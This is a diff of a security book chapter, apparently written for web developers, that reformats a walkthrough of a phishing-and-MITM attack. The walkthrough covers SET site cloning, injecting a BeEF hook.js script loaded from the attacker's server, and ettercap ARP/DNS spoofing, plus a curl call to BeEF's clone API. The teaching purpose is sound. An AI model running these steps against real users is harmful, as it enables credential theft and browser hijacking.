@@ -109,42 +109,66 @@ The following attack was one of five that I demonstrated at WDCNZ in 2015. The t
 
 You can find the video of how it is played out [here](https://www.youtube.com/watch?v=ymnqTrnF85M).
 
-##### Synopsis
-
-The average victim will see a valid URL and the spoof will be undetectable. Use website that you know victim is likely to spend some time at. This can make it easier if you're running exploits manually in BeEF.
-
-Can be used to obtain credentials or simply hook with BeEF and run any number of exploits.
-
-SET would be run on the website you want to clone. As SET only gets the index file, you'll have to use the likes of wget to get any other missing resources you need to complete the website. Static sites are obviously the easiest. We don't really want to have to create a back-end for the cloned website. You may have to update some of the link's to external resources as well in the index.html file that SET creates.
-
-Ideally you'll have cleaned out the public web directory that apache hosts from `/var/www/`. If you don't, I think SET archives everything in there.
+I> ## Synopsis
+I>
+I> The average victim will see a valid URL and the spoof will be undetectable.  
+I> Use website that you know victim is likely to spend some time at. This can make it easier if you're running exploits manually in BeEF.  
+I> Can be used to obtain credentials or simply hook with BeEF and run any number of exploits.  
+I> SET would be run on the website you want to clone. As SET only gets the index file, you'll have to use the likes of wget to get any other missing resources you need to complete the website. Static sites are obviously the easiest. We don't really want to have to create a back-end for the cloned website. You may have to update some of the link's to external resources as well in the index.html file that SET creates.  
+I> Ideally you'll have cleaned out the public web directory that apache hosts from `/var/www/`. If you don't, I think SET archives everything in there.
 
 {icon=bomb}
 G> ## The Play
 G>
-G> Run `setoolkit`  
-G> Choose:  
-G> `2) Website Attack Vectors`  
-G> `3) Credential Harvester Attack Method`  
-G> `2) Site Cloner`  
-G> Enter the IP address you want to host from. This will probably be the machine you're running these commands from. Although you could host anywhere.  
-G> Enter the URL to clone.  
-G> `y` to start apache.  
-G> Here you'll need to either wget any files your missing if you are missing some, or if there are only a small number, just grab them out of your browser developer tools.  
-G> Add the BeEF hook (`<script src="http://<BeEF comms server IP address>:3000/hook.js"></script>`) into the index.html in `/var/www/` usually at the end of the body, just before the `</body>` tag.  
-G> From the directory that you have BeEF installed, run the BeEF ruby script: `./beef`  
-G> Add an 'A' record of the website you've just cloned and want to spoof into ettercap's dns file: `echo "<domainname-you-want-to-clone.com> A <IP address that's hosting the clone>" >> /etc/ettercap/etter.dns`  
-G> Now run ettercap which is going to both ARP and DNS spoof your victim and the victim's gateway with the MITM option, using dns_spoof plugin: `ettercap -M arp:remote -P dns_spoof -q -T /<gateway IP address>/ /<victim IP address>/`.  
-G> You can now log into the BeEF web UI.  
-G> Now when the victim visits your cloned web site, the URL will look legitimate and they'll have no idea that their browser is a BeEF zombie continually asking it's master (the BeEF comms server) what to execute next.
+G> Run `setoolkit`
 G>
-G> BeEF can also be used to clone web sites using it's REST API, but it takes more work. The below on using BeEF to do this is only if you really have to.  
-In order to clone, once you have BeEF running: `curl -H "Content-Type: application/json: charset=UTF-8" -d '{"url":"http://<domainname-you-want-to-clone.com>", "mount":"/"}' -X POST http://127.0.0.1/api/seng/clone_page?token=<token that BeEF provides when you start it up each time>;`  
-G> The loop-back IP address is just the address that the BeEF REST API is listening on.  
-G> When you run this command, you should get back: `{"success":true,"mount":"/"}`, BeEF should also say that it's cloning page at URL `http://<domainname-you-want-to-clone.com>` with other information.  
-G> As with SET, if any resources other than a single index.html are required,
-then they also have to be acquired separately. With BeEF, they need to be copied into `/usr/share/beef-xss/extensions/social_engineering/web_cloner/cloned_pages/`. Routes have to be created in `/usr/share/beef-xss/extensions/social_engineering/web_cloner/interceptor.rb` and also modified to add new [config "hook"](http://sourceforge.net/p/piwat/WAT-Pentoo/ci/6402fce4c6966639927acb72c516edd203c41b77/tree/bin/beef/extensions/social_engineering/web_cloner/web_cloner.rb#l17), also added to `/usr/share/beef-xss/config.yaml`.  
-G> Within the same config.yaml file `host` seems to serve two purposes. The address to access beef and where to fetch hook.js from. If I use an external address, beef only listens on the external interface (can't reach via loopback). So I added a `hook` config which is the address that the beef communications server is listening on that gets inserted into the cloned web page.
+G> Choose:  
+G> `2) Website Attack Vectors`
+G>
+G> `3) Credential Harvester Attack Method`
+G>
+G> `2) Site Cloner`
+G>
+G> Enter the IP address you want to host from. This will probably be the machine you're running these commands from. Although you could host anywhere.
+G>
+G> Enter the URL to clone.
+G>
+G> `y` to start apache.
+G>
+G> Here you'll need to either wget any files your missing if you are missing some, or if there are only a small number, just grab them out of your browser developer tools.
+G>
+G> Add the BeEF hook (`<script src="http://<BeEF comms server IP address>:3000/hook.js"></script>`) into the index.html in `/var/www/` usually at the end of the body, just before the `</body>` tag.
+G>
+G> From the directory that you have BeEF installed, run the BeEF ruby script: `./beef`
+G>
+G> Add an 'A' record of the website you've just cloned and want to spoof into ettercap's dns file: `echo "<domainname-you-want-to-clone.com> A <IP address that's hosting the clone>" >> /etc/ettercap/etter.dns`
+G>
+G> Now run ettercap which is going to both ARP and DNS spoof your victim and the victim's gateway with the MITM option, using dns_spoof plugin: `ettercap -M arp:remote -P dns_spoof -q -T /<gateway IP address>/ /<victim IP address>/`.
+G>
+G> You can now log into the BeEF web UI.
+G>
+G> Now when the victim visits your cloned web site, the URL will look legitimate and they'll have no idea that their browser is a BeEF zombie continually asking it's master (the BeEF comms server) what to execute next.
+
+T> BeEF Can Also Clone
+T>
+T> BeEF can also be used to clone web sites using it's REST API, but it takes more work. The below on using BeEF to do this is only if you really have to.
+T>
+T> In order to clone, once you have BeEF running:  
+T> `curl -H "Content-Type: application/json: charset=UTF-8" -d '{"url":"http://<domainname-you-want-to-clone.com>", "mount":"/"}' -X POST http://127.0.0.1/api/seng/clone_page?token=<token that BeEF provides when you start it up each time>;`  
+T> The loop-back IP address is just the address that the BeEF REST API is listening on.  
+T> When you run this command, you should get back:  
+T> `{"success":true,"mount":"/"}`,  
+T> BeEF should also say that it's cloning page at URL:  
+T> `http://<domainname-you-want-to-clone.com>` with other information.  
+T>
+T> As with SET, if any resources other than a single index.html are required,
+then they also have to be acquired separately. With BeEF, they need to be copied into:  
+T> `/usr/share/beef-xss/extensions/social_engineering/web_cloner/cloned_pages/`.  
+T> Routes have to be created in:  
+T> `/usr/share/beef-xss/extensions/social_engineering/web_cloner/interceptor.rb`  
+T> and also modified to add new [config "hook"](http://sourceforge.net/p/piwat/WAT-Pentoo/ci/6402fce4c6966639927acb72c516edd203c41b77/tree/bin/beef/extensions/social_engineering/web_cloner/web_cloner.rb#l17),  
+T> also added to `/usr/share/beef-xss/config.yaml`.  
+T> Within the same config.yaml file `host` seems to serve two purposes. The address to access beef and where to fetch hook.js from. If I use an external address, beef only listens on the external interface (can't reach via loopback). So I added a `hook` config which is the address that the beef communications server is listening on that gets inserted into the cloned web page.
 
 
 
